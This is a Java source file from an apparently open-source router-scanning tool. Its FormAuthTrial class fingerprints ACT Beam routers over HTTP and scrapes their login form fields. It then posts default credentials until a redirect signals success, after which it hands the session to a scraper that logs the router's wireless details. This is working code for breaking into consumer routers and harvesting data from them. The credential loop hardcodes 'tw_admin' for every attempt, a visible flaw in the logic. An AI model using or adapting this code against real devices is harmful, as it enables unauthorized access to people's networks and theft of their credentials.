/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.authtrial.threads;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.net.def.beans.Credentials;
import org.koreops.tauro.cli.scraper.AbstractScraper;
import org.koreops.tauro.cli.scraper.formauth.ActBeamScraper;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

/**
 * This class tries out for Form Based Authentication trials for the router in hand.
 * It will try every known default User/Pass combination to try to see if the router is accessible. *
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 * @since 25 Sep, 2017 7:46 PM
 */
public class FormAuthTrial extends AbstractAuthTrial {

  private final String hostUrl;

  /**
   * Constructor for the Form Based Auth Default Login trial.
   *
   * @param host    The host that is being attacked
   * @param port    The port on which the HTTP server is running
   */
  public FormAuthTrial(String host, String port) {
    super();
    this.host = host;
    if (port != null) {
      this.port = Integer.valueOf(port);
    } else {
      this.port = 80;
    }
    hostUrl = this.forgeUrl("http://", this.host, this.port, "/");
  }

  @Override
  public void run() {
    try {
      Connection.Response response = Jsoup.connect(hostUrl).execute();
      boolean found = false;

      if (response.body().contains("window.location.href = \"/cgi-bin/webproc\"")) {
        // Confirmed ACT Beam router.
        String url = hostUrl + "cgi-bin/webproc";
        response = Jsoup.connect(url).execute();
        Map<String, String> cookies = response.cookies();
        Document doc = response.parse();
        Elements scripts = doc.getElementsByTag("script");
        String getpage = null;
        String varmenu = null;
        String varpage = null;
        String errorpage = null;
        String varlogin = null;
        String objaction = null;
        String username = null;
        String password = null;
        String action = null;
        String sessionid = null;
        for (Element script : scripts) {
          if (script.data().contains("function uipostLogin()")) {
            String[] lines = script.data().split("\n");
            for (String line : lines) {
              if (line.contains(":")) {
                if (line.contains("'getpage'")) {
                  getpage = this.sanitizeQuotes(line.substring(line.lastIndexOf(":") + 1, line.indexOf(",")));
                } else if (line.contains("'var:menu'")) {
                  varmenu = this.sanitizeQuotes(line.substring(line.lastIndexOf(":") + 1, line.indexOf(",")));
                } else if (line.contains("'var:page'")) {
                  varpage = this.sanitizeQuotes(line.substring(line.lastIndexOf(":") + 1, line.indexOf(",")));
                } else if (line.contains("'errorpage'")) {
                  errorpage = this.sanitizeQuotes(line.substring(line.lastIndexOf(":") + 1, line.indexOf(",")));
                } else if (line.contains("'var:login'")) {
                  varlogin = this.sanitizeQuotes(line.substring(line.lastIndexOf(":") + 1, line.indexOf(",")));
                } else if (line.contains("'obj-action'")) {
                  objaction = this.sanitizeQuotes(line.substring(line.lastIndexOf(":") + 1, line.indexOf(",")));
                } else if (line.contains("':username'")) {
                  username = this.sanitizeQuotes(line.substring(line.lastIndexOf(":") + 1, line.indexOf(",")));
                } else if (line.contains("':password'")) {
                  password = this.sanitizeQuotes(line.substring(line.lastIndexOf(":") + 1, line.indexOf(",")));
                } else if (line.contains("':action'")) {
                  action = this.sanitizeQuotes(line.substring(line.lastIndexOf(":") + 1, line.indexOf(",")));
                } else if (line.contains("':sessionid'")) {
                  int lastIdx = line.lastIndexOf(":") + 1;
                  int commaIdx = line.indexOf("\r");
                  sessionid = this.sanitizeQuotes(line.substring(lastIdx, commaIdx));
                }
              }
            }
            break;
          }
        }

        Map<String, String> data = new HashMap<>();
        data.put("getpage", getpage);
        data.put("errorpage", errorpage);
        data.put("var:menu", varmenu);
        data.put("var:login", varlogin);
        data.put("var:page", varpage);
        data.put("obj-action", objaction);
        data.put(":action", action);
        data.put(":sessionid", sessionid);

        Map<String, String> headers = new HashMap<>();
        headers.put("origin", hostUrl);

        Credentials successfulCredentials = null;

        for (Credentials credentials : CREDENTIALS_LIST) {
          username = "tw_admin";
          password = "tw_admin";
          data.put(":username", username);
          data.put(":password", password);
          cookies.put("language", "en_us");
          cookies.put("sys_UserName", username);
          cookies.put("Lan_IPAddress", host);
          response = Jsoup.connect(url)
              .data(data)
              .headers(headers)
              .cookies(cookies)
              .referrer(url)
              .method(Connection.Method.POST)
              .followRedirects(false)
              .execute();

          if (302 == response.statusCode()) {
            successfulCredentials = credentials;
            found = true;
            break;
          }
        }

        if (found) {
          AuthCrackParams params = new AuthCrackParams(successfulCredentials, cookies, headers, data);
          // Let's log.
          this.logWirelessStation(hostUrl, params);
        }
      }
    } catch (IOException e) {
      Logger.error(host + ": " + e.getMessage());
      e.printStackTrace();
    }
  }

  @Override
  protected void logWirelessStation(String hostUrl, AuthCrackParams params) {
    AbstractScraper scraper;
    boolean success;

    System.out.println("Trying ActBeam Scraper.");
    scraper = new ActBeamScraper(host, hostUrl, params);
    success = scraper.scrape();
    if (success) {
      return;
    }

    Logger.error(host + ": is not our run o' the Mill Modem.");
  }
}
